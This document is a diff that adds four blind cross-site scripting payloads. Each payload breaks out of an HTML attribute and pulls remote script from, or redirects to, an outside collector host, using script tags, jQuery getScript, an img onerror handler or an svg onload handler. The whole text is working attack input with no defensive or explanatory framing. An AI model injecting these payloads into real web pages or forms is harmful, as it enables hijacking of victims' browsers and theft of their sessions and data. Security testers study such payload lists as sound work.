@@ -1,0 +1,4 @@
+'"><script src=https://xss.report/c/hnterx?h1></script>
+<script>$.getScript("//xss.report/c/hnterx?h2")</script>
+'"<img src=x onerror='this.src="https://xss.report/c/hnterx?h3"'>
+'"<svg/onload="window.location.href='https://xss.report/c/hnterx?h4'">
